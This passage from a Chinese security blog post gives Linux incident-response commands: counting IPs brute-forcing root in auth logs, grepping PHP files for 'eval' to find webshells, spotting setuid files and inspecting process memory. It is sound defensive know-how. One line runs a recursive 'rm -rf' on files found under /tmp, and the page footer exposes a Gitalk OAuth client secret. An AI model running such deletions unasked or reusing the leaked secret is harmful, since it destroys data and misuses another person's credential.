+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; -c或——count：在每列旁边显示该行重复出现的次数；</span><br><span class="line">&gt; -d或--repeated：仅显示重复出现的行列；</span><br><span class="line">&gt; -f&lt;栏位&gt;或--skip-fields=&lt;栏位&gt;：忽略比较指定的栏位；</span><br><span class="line">&gt; -s&lt;字符位置&gt;或--skip-chars=&lt;字符位置&gt;：忽略比较指定的字符；</span><br><span class="line">&gt; -u或——unique：仅显示出一次的行列；</span><br><span class="line">&gt; -w&lt;字符位置&gt;或--check-chars=&lt;字符位置&gt;：指定要比较的字符。</span><br><span class="line">&gt; sort file.txt | uniq -u		只显示单一行</span><br><span class="line">&gt; sort file.txt | uniq -c		统计各行在文件中出现的次数</span><br><span class="line">&gt; sort file.txt | uniq -d 	在文件中找出重复的行</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p><strong>sort命令</strong>是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; -b：忽略每行前面开始出的空格字符；</span><br><span class="line">&gt; -c：检查文件是否已经按照顺序排序；</span><br><span class="line">&gt; -d：排序时，处理英文字母、数字及空格字符外，忽略其他的字符；</span><br><span class="line">&gt; -f：排序时，将小写字母视为大写字母；</span><br><span class="line">&gt; -i：排序时，除了040至176之间的ASCII字符外，忽略其他的字符；</span><br><span class="line">&gt; -m：将几个排序号的文件进行合并；</span><br><span class="line">&gt; -M：将前面3个字母依照月份的缩写进行排序；</span><br><span class="line">&gt; -n：依照数值的大小排序；</span><br><span class="line">&gt; -o&lt;输出文件&gt;：将排序后的结果存入制定的文件；</span><br><span class="line">&gt; -r：以相反的顺序来排序；</span><br><span class="line">&gt; -t&lt;分隔字符&gt;：指定排序时所用的栏位分隔字符；</span><br><span class="line">&gt; +&lt;起始栏位&gt;-&lt;结束栏位&gt;：以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p><strong>awk</strong>是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常用命令选项</span><br><span class="line"></span><br><span class="line">-F fs   fs指定输入分隔符，fs可以是字符串或正则表达式，如-F:</span><br><span class="line">-v var=value   赋值一个用户定义变量，将外部变量传递给awk</span><br><span class="line">-f scripfile  从脚本文件中读取awk命令</span><br><span class="line">-m[fr] val   对val值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。</span><br></pre></td></tr></table></figure>
+
+<p>当使用不带参数的<code>print</code>时，它就打印当前行，当<code>print</code>的参数是以逗号进行分隔时，打印时则以空格作为定界符。在awk的print语句块中双引号是被当作拼接符使用，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo | awk &apos;&#123; var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1,var2,var3; &#125;&apos;</span><br><span class="line">v1 v2 v3</span><br></pre></td></tr></table></figure>
+
+<p>双引号拼接使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo | awk &apos;&#123; var1=&quot;v1&quot;; var2=&quot;v2&quot;; var3=&quot;v3&quot;; print var1&quot;=&quot;var2&quot;=&quot;var3; &#125;&apos;</span><br><span class="line">v1=v2=v3</span><br></pre></td></tr></table></figure>
+
+<p>{ }类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i=0）以及打印文件头部的语句放入BEGIN语句块中，将打印的结果等语句放在END语句块中。</p>
+<p><strong>定位有多少 IP 在爆破主机的 root 帐号：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+
+<p><strong>登录成功的 IP 有哪些：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted &quot; /var/log/ secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure>
+
+<h2 id="head"><a href="#head" class="headerlink" title="head"></a>head</h2><p><strong>head命令</strong>用于显示文件的开头的内容。在默认情况下，head命令显示文件的头10行内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-n&lt;数字&gt;：指定显示头部内容的行数；</span><br><span class="line">-c&lt;字符数&gt;：指定显示头部内容的字符数；</span><br><span class="line">-v：总是显示文件名的头信息；</span><br><span class="line">-q：不显示文件名的头信息。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rx5viw46j211y0d2dhl.jpg" alt></p>
+<h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p><strong>type命令</strong>用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。</p>
+<p>命令类型：</p>
+<ul>
+<li><a href="http://man.linuxde.net/alias" target="_blank" rel="noopener">alias</a>：别名。</li>
+<li>keyword：关键字，Shell保留字。</li>
+<li>function：函数，Shell函数。</li>
+<li><a href="http://man.linuxde.net/builtin" target="_blank" rel="noopener">builtin</a>：内建命令，Shell内建命令。</li>
+<li><a href="http://man.linuxde.net/file" target="_blank" rel="noopener">file</a>：文件，磁盘文件，外部命令。</li>
+<li>unfound：没有找到。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># type nginx</span></span><br><span class="line">-bash: <span class="built_in">type</span>: nginx: not found</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># type if</span></span><br><span class="line"><span class="keyword">if</span> is a shell keyword</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># type which</span></span><br><span class="line"><span class="built_in">which</span> is aliased to `<span class="built_in">alias</span> | /usr/bin/<span class="built_in">which</span> --tty-only --<span class="built_in">read</span>-alias --show-dot --show-tilde<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[root@localhost ~]# type -a cd</span></span><br><span class="line"><span class="string">cd is a shell builtin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[root@localhost ~]# type -a grep</span></span><br><span class="line"><span class="string">grep is /bin/grep</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rx7lp2f7j20cu0ant91.jpg" alt></p>
+<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p><strong>wc命令</strong>用来计算数字。利用wc指令我们可以计算文件的Byte数、字数或是列数，若不指定文件名称，或是所给予的文件名为“-”，则wc指令会从标准输入设备读取数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-c或--bytes或——chars：只显示Bytes数；</span><br><span class="line">-l或——lines：只显示列数；</span><br><span class="line">-w或——words：只显示字数。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rxcohvnfj20a906zweh.jpg" alt></p>
+<h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><p><strong>lastb命令</strong>用于显示用户错误的登录列表，此指令可以发现系统的登录异常。单独执行lastb命令，它会读取位于<code>/var/log</code>目录下，名称为btmp的文件，并把该文件内容记录的登入失败的用户名单，全部显示出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-a：把从何处登入系统的主机名称或ip地址显示在最后一行；</span><br><span class="line">-d：将IP地址转换成主机名称；</span><br><span class="line">-f&lt;记录文件&gt;：指定记录文件；</span><br><span class="line">-n&lt;显示列数&gt;或-&lt;显示列数&gt;：设置列出名单的显示列数；</span><br><span class="line">-R：不显示登入系统的主机名称或IP地址；</span><br><span class="line">-x：显示系统关机，重新开机，以及执行等级的改变等信息。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1g0rxqvhwqyj20pb02w74h.jpg" alt></p>
+<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html/ -type f -name  &apos;*.php&apos;|xargs grep &apos;eval&apos; |more   查找php文件中带有eval字符串的文件</span><br></pre></td></tr></table></figure>
+
+<p>find：在指定目录下查找文件</p>
+<blockquote>
+<pre><code>\#  -name       //根据文件名查找（精确查找）
+
+\#  -iname       //根据文件名查找，但是不区分大小写
+
+\#  -user         //根据属主来查找文件
+
+\#  -group        //根据属组来查找文件
+
+\#find  /tmp  -uid  500  //查找uid是500 的文件
+
+\#find  /tmp  -gid  1000 // 查找gid是1000的文件
+
+\# -o 连接两个不同的条件（两个条件满足其一即可）
+
+\# -not 对条件取反的
+
+     -type
+
+           f     // 普通文件
+
+           d     //目录文件
+
+           l     //链接文件
+
+           b     //块设备文件
+
+           c     //字符设备文件
+
+           p     //管道文件
+
+           s     //socket文件
+
+[查找完执行的action]
+
+\# -print                                 //默认情况下的动作
+
+\# -ls                                     //查找到后用ls 显示出来
+
+\# -ok  [commend]                //查找后执行命令的时候询问用户是否要执行
+
+\# -exec [commend]              //查找后执行命令的时候不询问用户，直接执行
+
+find /tmp -name &quot;*.sh&quot; -exec chmod u+x {} \;       //这里要注意{}的使用：替代查找到的文件
+
+find /tmp -name &quot;*.sh&quot; -exec cp {} {}.old  \;         //这里要注意{}的使用：替代查找到的文件
+
+find  /tmp  -atime  +30  –exec rm –rf  {}  \；         //删除查找到的超过30天没有访问过文件
+
+find /var/www/ -type f -name  &apos;*.php&apos;|xargs grep &apos;eval&apos; |more     //使用xargs来对查找到的文件进一步操作</code></pre></blockquote>
+<blockquote>
+<p>-mtime -n +n  按文件更改时间来查找文件，-n 指 n 天以内，+n 指 n 天前</p>
+<p>-atime -n +n  按文件访问时间来查找文件，-n 指 n 天以内，+n 指 n 天前</p>
+<p>-ctime -n +n  按文件创建时间来查找文件，-n 指 n 天以内，+n 指 n 天前</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;	（查找 24 小时内被修改的 php 文件)</span><br><span class="line">find / -ctime 2					（查找 72 小时内新增的文件）</span><br></pre></td></tr></table></figure>
+
+<p><strong>ss特殊权限的文件查看</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / *.jsp -perm 4777</span><br></pre></td></tr></table></figure>
+
+<h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p><strong>lsof命令</strong>用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为lsof命令需要访问核心内存和各种文件，所以需要root用户执行。</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; -a：列出打开文件存在的进程；</span><br><span class="line">&gt; -c&lt;进程名&gt;：列出指定进程所打开的文件；</span><br><span class="line">&gt; -g：列出GID号进程详情；</span><br><span class="line">&gt; -d&lt;文件号&gt;：列出占用该文件号的进程；</span><br><span class="line">&gt; +d&lt;目录&gt;：列出目录下被打开的文件；</span><br><span class="line">&gt; +D&lt;目录&gt;：递归列出目录下被打开的文件；</span><br><span class="line">&gt; -n&lt;目录&gt;：列出使用NFS的文件；</span><br><span class="line">&gt; -i&lt;条件&gt;：列出符合条件的进程。（4、6、协议、:端口、 @ip ）</span><br><span class="line">&gt; -p&lt;进程号&gt;：列出指定进程号所打开的文件；</span><br><span class="line">&gt; -u：列出UID号进程详情；</span><br><span class="line">&gt; -h：显示帮助信息；</span><br><span class="line">&gt; -v：显示版本信息。</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">grep -rni &quot;shell.name&quot; * ： 根据文件名特征查找</span><br><span class="line"></span><br><span class="line">find / -size 1223123c ： 根据文件大小特征查找</span><br><span class="line"></span><br><span class="line">find / -mtime 1 -name * ： 根据文件创建时间查找</span><br><span class="line"></span><br><span class="line">lsof -p PID：查看进程占用信息</span><br><span class="line"></span><br><span class="line">cd /proc/PID ： 进入到进程中</span><br><span class="line"></span><br><span class="line">cat * |strings -n 5 |more ： 读取该进程内存中的信息</span><br></pre></td></tr></table></figure>
+
+<p>grep -rni &quot;shell.name&quot; * ： 根据文件名特征查找</p>
+<p>find / -size 1223123c ： 根据文件大小特征查找</p>
+<p>find / -mtime 1 -name * ： 根据文件创建时间查找</p>
+<p>lsof -p PID：查看进程占用信息</p>
+<p>cd /proc/PID ： 进入到进程中</p>
+<p>cat * |strings -n 5 |more ： 读取该进程内存中的信息</p>
+<p><strong>reference：</strong></p>
+<p><a href="https://www.hi-linux.com/posts/61543.html" target="_blank" rel="noopener">运维之美</a></p>
+<p><a href="https://app.yinxiang.com/Home.action" target="_blank" rel="noopener">Ms08067安全实验室</a></p>
+<p><a href="https://github.com/cujanovic/SSRF-Testing" target="_blank" rel="noopener">ssrf bypass大全</a></p>
+<p><a href="https://linuxwiki.github.io/NetTools/tcpdump.html" target="_blank" rel="noopener">tcpdump 抓包</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/03/05/2019-3-5-linux的小技巧/" title="linux小技巧">https://wh0ale.github.io/2019/03/05/2019-3-5-linux的小技巧/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i># linux</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/03/02/2019-3-2-WFUZZ大法/" rel="next" title="WFUZZ大法">
+                <i class="fa fa-chevron-left"></i> WFUZZ大法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/03/06/2019-3-6-xss平台/" rel="prev" title="xss平台">
+                xss平台 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#socat"><span class="nav-number">1.</span> <span class="nav-text">socat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#配合CURL-SSRF"><span class="nav-number">1.1.</span> <span class="nav-text">配合CURL SSRF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tcpdump"><span class="nav-number">2.</span> <span class="nav-text">tcpdump</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ios打包成ipa"><span class="nav-number">3.</span> <span class="nav-text">ios打包成ipa</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一些应急的linux命令"><span class="nav-number">4.</span> <span class="nav-text">一些应急的linux命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#uniq"><span class="nav-number">4.1.</span> <span class="nav-text">uniq</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sort"><span class="nav-number">4.2.</span> <span class="nav-text">sort</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#awk"><span class="nav-number">4.3.</span> <span class="nav-text">awk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#head"><span class="nav-number">4.4.</span> <span class="nav-text">head</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#type"><span class="nav-number">4.5.</span> <span class="nav-text">type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wc"><span class="nav-number">4.6.</span> <span class="nav-text">wc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lastb"><span class="nav-number">4.7.</span> <span class="nav-text">lastb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#find"><span class="nav-number">4.8.</span> <span class="nav-text">find</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsof"><span class="nav-number">4.9.</span> <span class="nav-text">lsof</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
